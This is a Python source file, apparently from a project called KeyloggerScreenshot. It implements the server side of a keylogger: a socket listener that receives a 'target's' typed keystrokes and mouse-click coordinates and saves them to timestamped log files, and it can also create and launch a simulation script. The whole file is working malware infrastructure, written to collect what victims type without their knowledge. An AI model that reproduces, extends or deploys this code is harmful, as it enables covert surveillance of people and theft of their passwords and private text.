import time
import socket
import os
import BetterPrinting as bp
from .Server_photos import ServerPhotos
from .Port_data import Ports
from .Simulation_code import Simulation
import KeyloggerScreenshot as ks

class ServerKeylogger:
    # This is the class of the Server. Both Server should not be in the same file
    def __init__(self, ip, port, simulater=False):
        self.is_True = None
        self.ip = ip
        self.port = port
        self.simulater = simulater
        self.new_data = None
        self.check_under = False
        self.new_cor = None
        self.full_msg = None
        self.cord = None
        self.false_url_error = ["No connection", "Invalid Url"]

    def do_file(self, spalten):
        if spalten != "":
            # If the data is not empty
            text = spalten
            for zeichen in text:
                if "{" == zeichen:
                    text = text.replace("{", " ")
            bp.color(f"Text of target: {text}", "magenta")
            zeit = time.strftime("%H-%M-%S-%Y")
            # This is the time the data has arrived
            with open(f"Keylogger of the target Time {zeit}.txt", "a+", encoding="utf-8") as file:
                file.write(f"HERE IS EVERYTHING THE TARGET HAS TYPED \n\n{text}")
                # That means data will appear even if the connection isn't stabled
        else:
            bp.color("The target hasn't written something in the meanwhile", "magenta")

    @staticmethod
    def terminator():
        bp.color("\nTHE CONNECTION HAS BEEN INTERRUPTED", "magenta")
        bp.color("THE SERVER WILL BE DESTROYED\n", "magenta")
        bp.color("TO RUN A SIMULATION RUN THE 'Simulation_code.py' SCRIPT\nIF YOU DONT HAVE ONE YOU CAN CREATE IT ON GITHUB\nALL THE INSTRUCTIONS ARE THERE: https://github.com/Kill0ger/KeyloggerScreenshot\n\nTHANK YOU FOR USING KEYLOGGERSCREENSHOT","magenta")
        os._exit(0)

    def message(self, real_data):
        # To know if the server has some issues
        for zeichen in real_data:
            if "{" == zeichen:
                # "{" this detects if a space or a tab is in self.full_msg
                self.new_data = real_data.replace("{", " ")
                self.check_under = True

        if self.check_under is False:
            self.new_data = real_data

        print(self.check_under)
        # The data is being stored in self.full_msg
        bp.color(f"Text of target: {self.new_data}", "magenta")
        zeit = time.strftime("%H-%M-%S-%Y")
        # This is the time the data has arrived
        if self.new_data != "":
            with open(f"Keylogger of the target Time {zeit}.txt", "a+", encoding="utf-8") as file:
                file.write(f"HERE IS EVERYTHING THE TARGET HAS TYPED \n\n{self.new_data}")

        else:
            bp.color("The Target didn't type something...", "magenta")

    def check_double(self):  # This function is here to check if there are more files with the same name
        dir = os.listdir()
        check = [each_name for each_name in dir if "mouseInfo" in each_name]
        if len(check) == 0:
            filename = "mouseInfoLog.txt"
        else:
            amount = len(check) + 1
            filename = f"mouseInfoLog {amount}.txt"

        return filename

    def start(self):
        self.is_True = False
        try:
            server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            server.bind((self.ip, self.port))
            server.listen(1000)

            bp.color("Waiting for connection....", "magenta")
            clientsocket, ipaddress = server.accept()
            # Data is in clientsocket and the ip-address is obviously in "ipaddress"
            bp.color(f"\nConnection has been established with {ipaddress}", "magenta")

            self.full_msg = ServerPhotos.get_data(self, clientsocket, "r", 8192)
            server.close()

            if ")]" in self.full_msg:
                if "***%§§)§§%" in self.full_msg:
                    self.new_cor = "[(" + self.full_msg.split("[(")[1]
                    spalten = self.full_msg.split("[(")[0].split("***%§§)§§%")
                    # This splits the data with the special code
                    self.do_file(spalten[1])

                else:
                    # Checks if the coordinates are there
                    self.cord = self.full_msg.split(")]")
                    self.new_cor = self.cord[0] + ")]"

                filename = self.check_double()
                with open(filename, "a+") as file:
                    # The coordinates will be stored in "mouseInfoLog.txt"
                    file.write(f"These are the coordinates of the target \n{self.new_cor}")
                bp.color("The coordinates of the target have been saved to your directory", "magenta")

                if "***%§§)§§%" in self.full_msg:
                    self.is_True = True

                if self.cord is not None:
                    if self.cord[1] == "":
                        bp.color("The target hasn't typed anything", "magenta")
                    else:
                        self.message(self.cord[1])

            elif "{" in self.full_msg and "THE CONNECTION HAS BEEN INTERRUPTED" not in self.full_msg:
                # This checks if the target hasn't clicked something and if there is still some data
                self.full_msg = self.full_msg.replace("[]", "")
                bp.color("The target hasn't clicked anything", "magenta")
                self.message(self.full_msg)

            elif "[]" == self.full_msg and "THE CONNECTION HAS BEEN INTERRUPTED" not in self.full_msg:
                # Checks if nothing has typed or clicked
                bp.color("The target hasn't typed and clicked anything", "magenta")
                # This shuts down the server
            else:
                self.do_file(self.full_msg.split("***%§§)§§%")[1])

            if self.is_True:
                time.sleep(1)
                self.terminator()

            if self.simulater is True:
                if "Simulation_code.py" not in os.listdir():
                    get_name = str(ks.Simulation_code).split("from")
                    full_name = get_name[1].split(">")[0]
                    full_name = full_name.split()[0]
                    full_name = full_name.split("'")[1]

                    with open(full_name, "r+") as file:
                        data = [each for each in file]
                        data += "\n\nSimulation.start_simulation()"

                    with open("Simulation_code.py", "a+") as file:
                        for line in data:
                            file.write(line)

                    bp.color('\n"Simulation_code.py" has been made\n', "magenta")

                print("Simulation will come in 10 seconds!!!")
                time.sleep(10)
                start = input("Do you want to start y/n?: ")
                if start not in ["y", "yes"]:
                    print("\nTHANK YOU FOR YOU USING KEYLOGGERSCREENSHOT")
                    os._exit(0)

                Simulation.start_simulation()

        except OSError:
            working_port = Ports.get_working_ports()
            if str(self.port) in working_port:
                bp.color(f"PLEASE USE AN OTHER PORT NUMBER FOR SERVERKEYLOGGER. PORT NUMBER: {self.port} already in use", "magenta")
                os._exit(0)
